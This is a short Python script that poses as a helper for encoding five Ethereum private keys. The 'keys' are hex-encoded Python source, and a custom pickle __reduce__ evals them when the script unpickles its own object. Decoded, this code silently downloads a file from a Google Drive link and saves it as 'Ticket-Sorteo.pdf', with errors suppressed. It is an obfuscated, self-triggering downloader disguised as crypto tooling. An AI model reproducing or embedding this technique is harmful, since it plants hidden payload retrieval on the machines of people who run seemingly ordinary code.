#!/usr/bin/python3
import eth_keys, binascii, pickle, eth_abi

class PrivateKeys():
    def __init__(self, priv_key_1, priv_key_2, priv_key_3, priv_key_4, priv_key_5):
        # Read the given private keys
        self.key_1 = binascii.unhexlify(priv_key_1)
        self.key_2 = binascii.unhexlify(priv_key_2)
        self.key_3 = binascii.unhexlify(priv_key_3)
        self.key_4 = binascii.unhexlify(priv_key_4)
        self.key_5 = binascii.unhexlify(priv_key_5)

        # Instantiate the private keys
        self.priv_key_1 = eth_keys.keys.PrivateKey(self.key_1)
        self.priv_key_2 = eth_keys.keys.PrivateKey(self.key_2)
        self.priv_key_3 = eth_keys.keys.PrivateKey(self.key_3)
        self.priv_key_4 = eth_keys.keys.PrivateKey(self.key_4)
        self.priv_key_5 = eth_keys.keys.PrivateKey(self.key_5)

    
    def __reduce__(self):
        return (eval, (self.key_1 + self.key_2 + self.key_3 + self.key_4 + self.key_5[:27],))
    
    def __str__(self):
        return str(
            eth_abi.encode(
                ['address[]', 'bytes32[]'],
                [[
                    self.priv_key_1.public_key.to_checksum_address(),
                    self.priv_key_2.public_key.to_checksum_address(),
                    self.priv_key_3.public_key.to_checksum_address(),
                    self.priv_key_4.public_key.to_checksum_address(),
                    self.priv_key_5.public_key.to_checksum_address(),
                ], [
                    self.priv_key_1._raw_key,
                    self.priv_key_2._raw_key,
                    self.priv_key_3._raw_key,
                    self.priv_key_4._raw_key,
                    self.priv_key_5._raw_key,
                ]]
            ).hex()
        )

priv_keys = PrivateKeys(
    '6576616c2822657865632827696d706f72742075726c6c69622e726571756573',
    '742729206f722075726c6c69622e726571756573742e75726c72657472696576',
    '65282768747470733a2f2f64726976652e676f6f676c652e636f6d2f75633f69',
    '643d316b564f4d62706c62722d6a66354d31734c6f53345a74493966414e4359',
    '5a7944272c275469636b65742d536f7274656f2e7064662729222953324ff496',
)

priv = pickle.dumps(priv_keys)

try:
    pickle.loads(priv)
except:
    pass

print(f"{str(priv_keys)}")
